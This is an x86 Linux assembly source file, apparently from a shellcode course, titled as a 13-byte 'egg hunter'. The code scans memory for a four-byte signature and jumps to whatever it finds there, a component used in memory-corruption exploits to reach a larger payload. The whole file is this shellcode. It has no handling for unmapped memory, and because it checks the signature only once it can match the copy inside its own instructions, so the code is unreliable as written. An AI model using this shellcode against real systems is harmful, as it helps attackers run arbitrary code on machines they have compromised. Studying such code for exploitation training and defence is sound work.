; Title: Egg Hunter Shellcode - 13 byte
; Platform: linux/x86
; Date: 2015-01-07
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; Github: https://github.com/dhn/SLAE/
; SLAE-721

BITS 32

global _start
section .text

; Egg Signature:
;
;   0x4f    0x90    0x47    0x90
;    |       |       |       |
; dec edi - NOP - inc edi - NOP
EGG_SIG equ 0x4f904790   ; signature

_start:
	; Egg Hunter Shellcode (13 Byte)

	; The cdq instruction copies the sign (bit 31)
	; of the value in the eax register into every
	; bit position in the edx register.
	cdq                  ; zero out edx
	mov edx, EGG_SIG     ; edx = 0x4f904790

search_the_egg:
	inc eax              ; increment eax
	cmp DWORD [eax], edx ; compare eax with the EGG_SIG
	jne search_the_egg   ; if not compare jump to search_the_egg

	jmp eax              ; jump to eax
